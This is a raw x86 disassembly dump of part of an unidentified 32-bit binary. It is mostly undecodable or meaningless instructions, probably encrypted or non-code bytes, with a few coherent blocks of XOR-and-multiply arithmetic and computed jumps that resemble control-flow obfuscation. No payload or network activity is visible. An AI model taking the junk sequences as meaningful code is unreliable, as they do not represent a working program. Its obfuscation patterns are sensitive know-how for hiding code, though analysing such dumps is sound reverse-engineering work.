  404201:	pop    es
  404202:	jmp    0xde7b54d6
  404207:	imul   edx,DWORD PTR ds:0xef4209f,0xc44e631c
  404211:	inc    ecx
  404212:	hlt    
  404213:	dec    esp
  404214:	(bad)  
  404215:	adc    ebx,edx
  404217:	aas    
  404218:	int    0xaf
  40421a:	dec    ebp
  40421b:	es adc edx,eax
  40421e:	xchg   edx,eax
  40421f:	stos   DWORD PTR es:[edi],eax
  404220:	sub    eax,0x4da5a2cd
  404225:	adc    eax,0x1885bdaa
  40422a:	sbb    al,0x97
  40422d:	mov    esi,0x2aa68d3f
  404232:	inc    edx
  404233:	sub    al,BYTE PTR [ecx-0xd]
  404236:	test   DWORD PTR [ecx+0x7],esi
  404239:	mov    ds,WORD PTR [ecx+0x1d]
  40423c:	(bad)  
  40423d:	in     al,dx
  40423e:	imul   ecx,DWORD PTR [esi-0x3c],0xdff0a5bf
  404245:	jae    0x40426f
  404247:	pop    es
  404248:	ins    DWORD PTR es:[edi],dx
  404249:	add    DWORD PTR [eax],esp
  40424b:	mov    eax,0xf833d033
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	inc    ebx
  404262:	sbb    ebx,esi
  404264:	cli    
  404265:	in     eax,dx
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x4041fc
  40426e:	mov    eax,0xa6ace6ca
  404273:	or     eax,0xb1fbacb6
  404278:	cdq    
  404279:	xchg   BYTE PTR [ebp-0x4c],bh
  40427c:	mov    ebp,ecx
  40427e:	pushf  
  40427f:	lds    ecx,FWORD PTR ss:[edx+0x45]
  404283:	inc    ebx
  404284:	fisubr DWORD PTR [ecx]
  404286:	jae    0x404236
  404288:	inc    ecx
  404289:	jmp    0x1576f7b6
  40428e:	in     al,0x34
  404290:	ret    0xe911
  404293:	or     eax,0x30288c0f
  404298:	xor    DWORD PTR [ebx+0x7beae9c9],esi
  40429e:	mov    al,0x38
  4042a0:	retf   0xdbd8
  4042a3:	add    edx,DWORD PTR [ebp-0xdfb8a50]
  4042a9:	add    BYTE PTR [ecx+eax*4-0x64039faf],dl
  4042b0:	lock cmc 
  4042b2:	stos   BYTE PTR es:[edi],al
  4042b3:	lock xchg edx,eax
  4042b5:	and    eax,0x39ae83af
  4042ba:	push   edx
  4042bb:	sbb    BYTE PTR [eax],dl
  4042bd:	cwde   
  4042be:	add    DWORD PTR [eiz*2+0x13d02f03],0xffffff96
  4042c6:	dec    esp
  4042c7:	imul   ecx,DWORD PTR [ebx],0xdb584769
  4042cd:	stos   BYTE PTR es:[edi],al
  4042ce:	fidiv  DWORD PTR [ecx]
  4042d0:	lock sub BYTE PTR [ebp-0x1e],0xa6
  4042d5:	stos   BYTE PTR es:[edi],al
  4042d6:	imul   BYTE PTR [edi]
  4042d8:	pop    edx
  4042d9:	mov    ah,0x16
  4042db:	and    ecx,DWORD PTR [esi+0x6ea7bdb6]
  4042e1:	pop    es
  4042e2:	sbb    eax,0x49adb86
  4042e7:	cdq    
  4042e8:	lock mov ch,cl
  4042eb:	xor    eax,0xa62af5ab
  4042f0:	inc    edx
  4042f1:	push   0x1c
  4042f3:	and    esp,DWORD PTR ds:0x4b1966bc
  4042f9:	and    edi,0x5f6350a7
  4042ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404300:	clc    
  404301:	mov    al,ds:0x6b09560
  404306:	ss xor eax,0xdb4be84a
  40430c:	popa   
  40430d:	scas   eax,DWORD PTR es:[edi]
  40430e:	sub    al,0xb5
  404310:	rol    DWORD PTR [eax-0x54],0x35
  404314:	xchg   DWORD PTR [ebx+eiz*4-0x6b],ebx
  404318:	adc    al,BYTE PTR es:[ebx]
  40431b:	daa    
  40431c:	shl    cl,0xb3
  40431f:	jmp    0x404361
  404321:	dec    ecx
  404322:	out    0xd4,eax
  404324:	push   cs
  404325:	sti    
  404326:	stc    
  404327:	test   eax,0x81b130f5
  40432c:	dec    edi
  40432d:	mov    ecx,0xa88b44ba
  404332:	dec    ecx
  404333:	cwde   
  404334:	adc    BYTE PTR [ecx],bl
  404336:	mov    esp,0x3259f605
  40433b:	loopne 0x40433a
  40433d:	add    eax,DWORD PTR [edx+edi*4]
  404340:	sub    eax,0x849448ab
  404345:	cmp    ah,dh
  404347:	mov    bl,0xf5
  404349:	fsub   QWORD PTR [edx]
  40434b:	jge    0x4042fb
  40434d:	mov    al,0x37
  40434f:	sub    eax,0xbc996944
  404354:	jnp    0x4043cd
  404356:	ror    DWORD PTR [eax-0x5ebe7688],1
  40435c:	add    al,0x2c
  40435e:	pop    edi
  40435f:	fcom   DWORD PTR [ecx-0x41]
  404362:	mov    ebx,0x3923af84
  404367:	sub    DWORD PTR [ebx],edx
  404369:	and    esp,edx
  40436b:	pop    ds
  40436c:	xchg   ecx,eax
  40436d:	push   ecx
  40436e:	add    al,0x75
  404370:	mov    ds:0x2725238c,al
  404375:	sub    DWORD PTR [eax],edx
  404377:	and    al,0x26
  40437a:	in     eax,0x6f
  40437c:	mov    al,0x9d
  40437e:	mov    ds:0xfe2a0add,al
  404383:	adc    BYTE PTR [ecx-0x73566137],bl
  404389:	cmp    DWORD PTR [edi+0x6eed0a84],ebp
  40438f:	lahf   
  404390:	dec    edx
  404391:	xlat   BYTE PTR ds:[ebx]
  404392:	dec    ebx
  404393:	sbb    DWORD PTR ds:0x8f13467f,esp
  404399:	fwait
  40439a:	clc    
  40439b:	(bad)  
  40439c:	mov    cl,cl
  40439e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40439f:	pop    ebp
  4043a0:	xor    eax,0xa8d4ef70
  4043a5:	and    eax,DWORD PTR [ecx-0x63]
  4043a8:	les    ebx,FWORD PTR [ebx+esi*4+0x67]
  4043ac:	call   0x728c3baf
  4043b1:	inc    eax
  4043b2:	and    eax,0x5d8bd098
  4043b7:	addr16 mov bh,0xc9
  4043ba:	(bad)  
  4043bb:	xlat   BYTE PTR ds:[ebx]
  4043bc:	test   eax,0xe94160ba
  4043c1:	shl    DWORD PTR ds:0xdad66bc8,1
  4043c8:	and    eax,0xcff387b0
  4043cd:	adc    eax,0xa449f3e2
  4043d2:	push   ds
  4043d3:	call   0x2ee:0x5feef2da
  4043da:	stos   DWORD PTR es:[edi],eax
  4043db:	loop   0x4043a3
  4043dd:	jmp    0x76fbd6a7
  4043e2:	pop    edx
  4043e3:	push   ds
  4043e4:	mov    ecx,0xd5977449
  4043e9:	sbb    BYTE PTR [ecx],dl
  4043eb:	xchg   esp,esi
  4043ed:	mov    dh,0xb9
  4043ef:	mov    cl,0x51
  4043f1:	dec    ecx
  4043f2:	pop    ds
  4043f3:	xchg   ebx,eax
  4043f4:	shr    DWORD PTR [esi+0x5af8fae9],1
  4043fa:	add    edi,ecx
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0xe26701df,al
  40444e:	aas    
  40444f:	jp     0x404468
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x40441b
  404458:	pop    ebx
  404459:	out    dx,eax
  40445a:	fcom   st(6)
  40445c:	sahf   
  40445d:	sub    esp,edx
  40445f:	pop    ebp
  404460:	xchg   edi,eax
  404461:	sti    
  404462:	xor    edi,ebp
  404464:	aaa    
  404465:	in     al,0x7c
  404467:	cld    
  404468:	or     bh,BYTE PTR [esi-0x1b19df58]
  40446e:	or     eax,0x40e36685
  404473:	nop
  404474:	and    dh,cl
  404476:	aas    
  404477:	mov    bh,0x4b
  404479:	cmp    BYTE PTR [ecx+0x73f34f86],dl
  40447f:	shl    DWORD PTR [ebx-0x36],1
  404482:	in     eax,0xda
  404484:	xchg   ebp,eax
  404485:	jo     0x4044fe
  404487:	pop    edi
  404488:	(bad)  
  404489:	jmp    0x779b:0x97017636
  404490:	add    al,0x72
  404492:	sbb    DWORD PTR [eax+0x42],edx
  404495:	sub    eax,0xa77b5504
  40449a:	sub    eax,0xd9593b30
  40449f:	mov    dl,0x3e
  4044a1:	ss jge 0x404462
  4044a4:	popf   
  4044a5:	push   esi
  4044a6:	out    0x7,al
  4044a8:	out    0x7,al
  4044aa:	dec    edx
  4044ab:	jp     0x4044bb
  4044ad:	pop    esi
  4044ae:	push   0x1457878e
  4044b3:	or     al,0x6c
  4044b5:	mov    ebx,0xc3a6ac5a
  4044ba:	je     0x4044db
  4044bc:	push   ss
  4044bd:	loope  0x4044e5
  4044bf:	popa   
  4044c0:	dec    edx
  4044c1:	fsubrp st(5),st
  4044c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c4:	leave  
  4044c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c6:	imul   esi,DWORD PTR [esi-0x3c],0xffffffc9
  4044ca:	mov    edi,0xbe21a19f
  4044cf:	stos   DWORD PTR es:[edi],eax
  4044d0:	push   0xffffff86
  4044d2:	lds    edi,FWORD PTR [esi-0x3a]
  4044d5:	pop    ebx
  4044d6:	adc    al,0xc6
  4044d8:	dec    esp
  4044d9:	add    al,0x54
  4044db:	sbb    al,0xb8
  4044dd:	ret    0x7190
  4044e0:	arpl   WORD PTR [eax-0x37474467],sp
  4044e6:	mov    eax,ds:0xa37a6d19
  4044eb:	mov    ds:0x6e173d08,al
  4044f0:	ret    
  4044f1:	mov    bl,BYTE PTR [ebp+eax*2-0x46456484]
  4044f8:	out    dx,eax
  4044f9:	or     BYTE PTR [ebx+0x45935811],bl
  4044ff:	and    DWORD PTR [ebp-0x3e937043],edx
  404505:	dec    esi
  404506:	repz loope 0x404500
  404509:	cdq    
  40450a:	xor    edx,DWORD PTR [edi]
  40450c:	dec    edx
  40450d:	gs enter 0x7126,0x28
  404512:	push   ebx
  404513:	into   
  404514:	cmp    DWORD PTR [esi],esp
  404516:	jp     0x40458e
  404518:	call   0x245a:0x643ef38f
  40451f:	fstp   DWORD PTR ds:0x7d338b8a
  404525:	jmp    0x404569
  404527:	or     dh,dl
  404529:	test   BYTE PTR [edi+0x16],bl
  40452c:	es jnp 0x4044df
  40452f:	clc    
  404530:	cld    
  404531:	nop
  404532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404533:	in     al,0x1b
  404535:	stos   BYTE PTR es:[edi],al
  404536:	inc    esp
  404537:	jae    0x40459a
  404539:	popa   
  40453a:	fidiv  DWORD PTR [ebx+0x5a]
  40453d:	rol    DWORD PTR cs:[edi],1
  404540:	lds    ebx,FWORD PTR [edi+edi*1-0x7c]
  404544:	stos   BYTE PTR es:[edi],al
  404545:	sub    al,0xd
  404547:	mov    ebp,0x8622a812
  40454c:	addr16 aaa 
  40454e:	int3   
  40454f:	sub    ecx,ecx
  404551:	stos   BYTE PTR es:[edi],al
  404552:	mul    BYTE PTR [eax+0x2c]
  404555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404556:	shl    DWORD PTR [ebx],1
  404558:	stos   DWORD PTR es:[edi],eax
  404559:	jne    0x404585
  40455b:	sti    
  40455c:	in     eax,dx
  40455d:	mov    ebp,0xe5409a70
  404562:	(bad)  
  404564:	xchg   BYTE PTR [edx],ch
  404566:	xrelease xchg BYTE PTR [ebx],bl
  404569:	xchg   BYTE PTR [edi],dl
  40456b:	cmp    ah,0xfb
  40456e:	mov    cl,0xb0
  404570:	leave  
  404571:	arpl   WORD PTR [edi-0x67],ax
  404574:	push   es
  404575:	add    eax,0x86e8a327
  40457a:	inc    esi
  40457b:	stos   DWORD PTR es:[edi],eax
  40457c:	call   0x8333:0xdfa4f82e
  404583:	inc    esi
  404584:	loope  0x4045cf
  404586:	lea    ecx,[esi-0x3a]
  404589:	or     edi,DWORD PTR [edi-0x46]
  40458c:	xor    cl,dl
  40458e:	pop    edx
  40458f:	adc    eax,0x32c2376a
  404594:	jg     0x404550
  404596:	sub    al,0xa4
  404598:	mov    esi,0x924427cd
  40459d:	mov    edx,0x8e122d0d
  4045a2:	push   esi
  4045a3:	add    BYTE PTR [ebx-0x22],al
  4045a6:	aas    
  4045a7:	imul   esi,ebp,0xffffff86
  4045aa:	mov    esi,0x72ea1032
  4045af:	pop    esp
  4045b0:	sbb    ecx,esp
  4045b2:	das    
  4045b3:	inc    eax
  4045b4:	pop    ds
  4045b5:	shl    DWORD PTR [edx-0x15620a75],0x49
  4045bc:	jle    0x404606
  4045be:	test   al,0xc7
  4045c0:	and    BYTE PTR [ecx-0x14439609],al
  4045c6:	call   0xa4f0737a
  4045cb:	xchg   BYTE PTR [esi+ecx*8],cl
  4045ce:	in     eax,dx
  4045cf:	jmp    0x4045b0
  4045d1:	jge    0x4045b0
  4045d3:	call   0x47bf:0xc3075a6f
  4045da:	dec    ebp
  4045db:	and    bl,BYTE PTR [ebx+0x66285d1e]
  4045e1:	adc    ebp,0xffffffa8
  4045e4:	mov    edx,DWORD PTR [ebp-0x34]
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x7ce040d0],al
  40466a:	mov    dl,0x94
  40466c:	imul   DWORD PTR [ecx]
  40466e:	jle    0x4046ee
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x404676
  404675:	retf   
  404676:	mov    WORD PTR [edx+0x6c74cd94],ds
  40467c:	pop    ebx
  40467d:	xlat   BYTE PTR ds:[ebx]
  40467e:	mov    dh,0x62
  404680:	aaa    
  404681:	mov    edx,0x1c0c08c9
  404686:	test   BYTE PTR [edi-0x4c4b56e3],cl
  40468c:	into   
  40468d:	aas    
  40468e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40468f:	and    al,0xf4
  404691:	dec    esp
  404692:	test   DWORD PTR [ecx],esp
  404694:	jns    0x404652
  404696:	sub    ebp,DWORD PTR [esi+0x4b1673e8]
  40469c:	jecxz  0x4046bf
  40469e:	aaa    
  40469f:	mov    DWORD PTR [esi-0x61],ebx
  4046a2:	adc    DWORD PTR [ebx-0x5c],esp
  4046a5:	sub    eax,0xaf456fa3
  4046aa:	push   eax
  4046ab:	mov    eax,0x3bcbe084
  4046b0:	mov    esi,0x2b5343ce
  4046b5:	push   edi
  4046b6:	jmp    0x6bdc2f88
  4046bb:	push   edi
  4046bc:	mov    ebx,0xcab85f1c
  4046c1:	inc    ebx
  4046c2:	mov    esi,0xe5eb65bc
  4046c7:	lods   al,BYTE PTR ds:[esi]
  4046c8:	imul   DWORD PTR [esi-0x74933c22]
  4046ce:	push   0xbdcea2fe
  4046d3:	sub    al,0xba
  4046d5:	in     al,0x7
  4046d7:	dec    ebx
  4046d8:	inc    edx
  4046d9:	out    0xf2,eax
  4046db:	lods   al,BYTE PTR ds:[esi]
  4046dc:	imul   ebp,DWORD PTR [ecx],0xa2639137
  4046e2:	hlt    
  4046e3:	icebp  
  4046e4:	call   0xbaa3b990
  4046e9:	int    0x33
  4046eb:	shl    DWORD PTR [esi-0x59de43ef],1
  4046f1:	pop    edx
  4046f2:	push   es
  4046f3:	dec    esi
  4046f4:	ins    BYTE PTR es:[edi],dx
  4046f5:	xchg   esi,eax
  4046f6:	jg     0x404776
  4046f8:	pop    ss
  4046f9:	mov    eax,ds:0x6b517dee
  4046fe:	xchg   ecx,eax
  4046ff:	dec    esi
  404700:	ins    DWORD PTR es:[edi],dx
  404701:	xchg   DWORD PTR [eax],ebp
  404703:	std    
  404704:	cmp    DWORD PTR [edi+0x49ecbe2b],ecx
  40470a:	mov    ds:0x580f85ac,al
  40470f:	popf   
  404710:	xchg   esi,eax
  404711:	xchg   edx,eax
  404712:	sbb    bh,bh
  404714:	or     DWORD PTR [esi-0x33401ce],ebx
  40471a:	sub    DWORD PTR [edx-0x1f463679],ebp
  404720:	pop    edi
  404721:	js     0x4046d1
  404723:	je     0x404726
  404725:	jle    0x404798
  404727:	mul    DWORD PTR [edx+0x73]
  40472a:	inc    ebx
  40472b:	ins    BYTE PTR es:[edi],dx
  40472c:	loop   0x40470e
  40472e:	std    
  40472f:	lds    edx,FWORD PTR [ebx-0x1b]
  404732:	push   ebp
  404733:	push   esi
  404734:	mov    cs,WORD PTR [esi-0x12]
  404737:	jge    0x4047b8
  404739:	xor    DWORD PTR [ecx],ebx
  40473b:	outs   dx,BYTE PTR ds:[esi]
  40473c:	mov    ds:0xc4f2ab0b,eax
  404741:	cmp    DWORD PTR [ebx],edi
  404743:	xchg   DWORD PTR [eax],edi
  404745:	sub    BYTE PTR [ebp-0x78a0ecd3],0x18
  40474c:	cmp    al,0x5c
  40474e:	push   es
  40474f:	in     al,0x42
  404751:	in     eax,dx
  404752:	jo     0x404762
  404754:	push   eax
  404755:	sbb    eax,0x44e5fe94
  40475a:	push   0xffffffc6
  40475c:	ds daa 
  40475e:	adc    ebx,DWORD PTR [esi]
  404760:	aad    0xc6
  404762:	repnz ins BYTE PTR es:[edi],dx
  404764:	repnz dec ecx
  404766:	sbb    BYTE PTR [ebx+0x55],cl
  404769:	inc    ebp
  40476a:	or     DWORD PTR [ecx-0x2e546d4c],edx
  404770:	xor    eax,0xd9eda8b7
  404775:	rol    DWORD PTR [ecx+0x6383d618],0xb7
  40477c:	dec    esp
  40477d:	pusha  
  40477e:	mov    ah,0xab
  404780:	xor    DWORD PTR [edi-0x7304a872],esi
  404786:	imul   edx,DWORD PTR [edi],0x6de05568
  40478c:	mov    eax,0xf5c09bf3
  404791:	adc    esi,DWORD PTR [ebp-0x14]
  404794:	and    edi,DWORD PTR [ebp-0x31]
  404797:	test   DWORD PTR [edx+0x1e5e3d4b],0x98233b81
  4047a1:	jmp    0xfb6f:0xcf0b8f9c
  4047a8:	je     0x40474f
  4047aa:	add    BYTE PTR [ebp-0x16],0x95
  4047ae:	sbb    ecx,DWORD PTR [eax]
  4047b0:	stos   BYTE PTR es:[edi],al
  4047b1:	into   
  4047b2:	jno    0x40477f
  4047b4:	jnp    0x404738
  4047b6:	loopne 0x4047b6
  4047b8:	xchg   edi,eax
  4047b9:	fcomp  DWORD PTR [ecx]
  4047bb:	jmp    0x4aa7c878
  4047c0:	sub    ebp,0xffffff97
  4047c3:	and    BYTE PTR [eax],dl
  4047c5:	call   0x5a8b:0x752dc731
  4047cc:	and    eax,0x3e0d64e9
  4047d1:	cli    
  4047d2:	push   ds
  4047d3:	loopne 0x4047c8
  4047d5:	mov    cl,0x33
  4047d7:	mov    edi,DWORD PTR [ebp-0x780f6196]
  4047dd:	fcmovbe st,st(6)
  4047df:	shl    BYTE PTR [edx],cl
  4047e1:	push   es
  4047e2:	inc    ebp
  4047e3:	jae    0x4047f3
  4047e5:	ins    DWORD PTR es:[edi],dx
  4047e6:	sub    esp,edx
  4047e8:	mov    al,ds:0x7bf977f1
  4047ed:	dec    ebx
  4047ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047ef:	popf   
  4047f0:	jmp    0xc2df8d36
  4047f5:	mov    esi,0x9807366e
  4047fa:	jns    0x404870
  4047fc:	jno    0x4047f0
  4047fe:	test   DWORD PTR [eax],eax
  404800:	ja     0x404835
  404802:	rol    BYTE PTR [ebx],1
  404804:	push   ebp
  404805:	in     al,dx
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx-0x4ee20f46],0x12
  40482a:	test   DWORD PTR [ebx+ebp*1],0x7f8b7e7e
  404831:	jle    0x4048b1
  404833:	xlat   BYTE PTR ds:[ebx]
  404834:	daa    
  404835:	shl    esi,cl
  404837:	out    dx,eax
  404838:	push   ecx
  404839:	in     al,dx
  40483a:	cli    
  40483b:	clc    
  40483c:	xchg   esi,eax
  40483d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40483e:	mov    eax,0x42149815
  404843:	sti    
  404844:	xor    eax,0x6f3eae2
  404849:	jmp    0x40485e
  40484b:	mov    bl,0x41
  40484d:	pop    edx
  40484e:	mov    ebx,0x23e2c7be
  404853:	mov    bl,0x6f
  404855:	mov    ds:0xf0efb201,eax
  40485a:	stc    
  40485b:	loop   0x40489c
  40485d:	push   eax
  40485e:	call   0x25a3cfa7
  404863:	es mov bl,0x7f
  404866:	imul   eax,DWORD PTR [eax],0xffffff8b
  404869:	lods   eax,DWORD PTR ds:[esi]
  40486a:	push   ds
  40486b:	push   0xffffffa1
  40486d:	or     BYTE PTR [edx-0x64107292],ah
  404873:	inc    edx
  404874:	imul   edi,DWORD PTR [edi+0x1c4786fd],0x2801b59a
  40487e:	cwde   
  40487f:	inc    ebp
  404880:	(bad)
  404883:	in     al,0x93
  404885:	enter  0x775,0x65
  404889:	cmp    ebp,DWORD PTR [edi]
  40488b:	dec    ebx
  40488c:	sub    al,0xe1
  40488e:	sub    eax,0x77a7aae
  404893:	mov    esp,0x7f32c603
  404898:	loopne 0x404829
  40489a:	lods   al,BYTE PTR ds:[esi]
  40489b:	out    dx,al
  40489c:	int    0x67
  40489e:	sbb    eax,0xd4b58275
  4048a3:	aaa    
  4048a4:	stc    
  4048a5:	sti    
  4048a6:	fnsave [eax-0x11]
  4048a9:	pop    esp
  4048aa:	jnp    0x40489e
  4048ac:	jg     0x4048be
  4048ae:	mov    eax,0x2240fcf1
  4048b3:	mov    bl,0x51
  4048b5:	fdiv   st,st(7)
  4048b7:	(bad)  
  4048b8:	pusha  
  4048b9:	(bad)  
  4048ba:	stc    
  4048bb:	fninit 
  4048bd:	xchg   esp,eax
  4048be:	jae    0x4048e7
  4048c0:	cmp    esp,edx
  4048c2:	pop    eax
  4048c3:	inc    ecx
  4048c4:	shl    BYTE PTR ds:0xfc046347,0xf9
  4048cb:	mov    bh,0x56
  4048cd:	add    DWORD PTR [eax+0x47],0x54
  4048d1:	or     esi,edx
  4048d3:	and    eax,DWORD PTR [ebx+esi*2-0x4a]
  4048d7:	dec    ecx
  4048d8:	rcl    ecx,0xca
  4048db:	push   ds
  4048dc:	hlt    
  4048dd:	or     al,0xe
  4048df:	pop    ebx
  4048e0:	jmp    0xfd88:0x5d7d490e
  4048e7:	loop   0x4048cf
  4048e9:	aas    
  4048ea:	test   BYTE PTR [edi-0x286f7e91],ch
  4048f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048f1:	fmul   DWORD PTR [ecx+edi*8]
  4048f4:	push   ss
  4048f5:	pusha  
  4048f6:	cmp    eax,0xcd19cd00
  4048fb:	mov    bh,0xa7
  4048fd:	adc    edx,DWORD PTR [ecx]
  4048ff:	push   ebp
  404900:	fwait
  404901:	stc    
  404902:	hlt    
  404903:	sub    ebp,0x17
  404906:	outs   dx,BYTE PTR ds:[esi]
  404907:	xor    al,0xf5
  404909:	es lock push edi
  40490c:	fldcw  WORD PTR [esi+0x5f354614]
  404912:	pop    esi
  404913:	cmp    edi,esp
  404915:	enter  0x839b,0xb0
  404919:	jge    0x4048c0
  40491b:	pop    eax
  40491c:	mov    edx,0xb3a11639
  404921:	xchg   ecx,eax
  404922:	cs inc esi
  404924:	add    al,0x75
  404926:	mov    DWORD PTR [edx+0x77ee15e0],ecx
  40492c:	(bad)  
  40492e:	push   cs
  40492f:	in     al,0xd
  404931:	inc    eax
  404932:	nop
  404933:	push   0xd6fd6cde
  404938:	mov    ds:0xcb61884e,al
  40493d:	outs   dx,BYTE PTR ds:[esi]
  40493e:	sbb    dh,0x77
  404941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404942:	push   edi
  404943:	dec    esi
  404944:	pop    edi
  404945:	dec    ebp
  404946:	sbb    esi,DWORD PTR [edi+edi*4+0x78ea954c]
  40494d:	fucom  st(6)
  40494f:	fnstenv [eax-0x26]
  404952:	in     eax,0xcd
  404954:	and    eax,0xc565121d
  404959:	(bad)  
  40495a:	stc    
  40495b:	ja     0x404904
  40495d:	inc    edi
  40495e:	xor    DWORD PTR [eax],edi
  404960:	and    al,0xae
  404962:	xlat   BYTE PTR ds:[ebx]
  404963:	iret   
  404964:	and    al,0x35
  404966:	xor    BYTE PTR [edx+0x29],al
  404969:	in     eax,0x45
  40496b:	push   0x54
  40496d:	xor    DWORD PTR [ebx-0x334c55fd],ecx
  404973:	jbe    0x4049d6
  404975:	cli    
  404976:	fmul   QWORD PTR [esi-0x1f]
  404979:	pop    ebx
  40497a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40497b:	ins    BYTE PTR es:[edi],dx
  40497c:	mov    ecx,0xf718bdd9
  404981:	pushf  
  404982:	or     eax,0x97dad455
  404987:	dec    eax
  404988:	cmp    BYTE PTR [ebx],al
  40498a:	jae    0x4049a8
  40498c:	pushf  
  40498d:	mov    esi,0xce0e0136
  404992:	mov    ds:0xfda3b832,eax
  404997:	aaa    
  404998:	sbb    al,0x68
  40499a:	inc    esi
  40499b:	lods   eax,DWORD PTR ds:[esi]
  40499c:	cs jg  0x4049ef
  40499f:	inc    edx
  4049a0:	jg     0x40497a
  4049a2:	(bad)  
  4049a3:	out    dx,al
  4049a4:	jbe    0x404a17
  4049a6:	push   ebx
  4049a7:	jecxz  0x404959
  4049a9:	or     eax,esi
  4049ab:	imul   edx,DWORD PTR [edi],0xb
  4049ae:	and    esp,DWORD PTR [ebx]
  4049b0:	pop    ebx
  4049b1:	sbb    BYTE PTR [edi-0x1],cl
  4049b4:	adc    DWORD PTR [ecx-0x34],ebp
  4049b7:	sub    edx,edx
  4049b9:	in     eax,0x32
  4049bb:	scas   eax,DWORD PTR es:[edi]
  4049bc:	cdq    
  4049bd:	push   eax
  4049be:	cmp    DWORD PTR [edx+0x5503d033],esp
  4049c4:	in     al,dx
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    DWORD PTR [ebx-0x3a],eax
  4049d8:	(bad)  
  4049d9:	es xchg ecx,eax
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x4049ef
  4049e3:	xor    dl,cl
  4049e5:	mov    ds:0x861c317c,eax
  4049ea:	sub    esi,DWORD PTR ds:0x6edbd40b
  4049f0:	jmp    0x4049dd
  4049f2:	jbe    0x4049b2
  4049f4:	frstor [eax]
  4049f6:	fnstcw WORD PTR [eax+0x441fa65c]
  4049fc:	popa   
  4049fd:	cmp    DWORD PTR [ebx-0x21bb0eaa],0xffffffd2
  404a04:	rcl    BYTE PTR [edi-0xe],cl
  404a07:	imul   eax,ecx,0x40e50f42
  404a0d:	sar    ecx,1
  404a0f:	jle    0x404a21
  404a11:	ins    BYTE PTR es:[edi],dx
  404a12:	out    0xac,al
  404a14:	fldcw  WORD PTR [eax+eax*4]
  404a17:	mov    ds:0x7d13fb6b,eax
